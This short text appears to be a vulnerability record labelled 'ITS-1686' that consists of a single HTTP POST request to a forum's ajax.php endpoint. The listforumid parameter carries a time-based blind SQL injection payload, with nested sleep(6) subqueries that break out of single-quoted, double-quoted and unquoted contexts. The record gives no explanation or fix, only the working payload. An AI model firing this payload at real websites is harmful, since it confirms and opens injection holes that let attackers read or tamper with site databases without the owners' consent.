# Vulnerable: ITS-1686
POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10
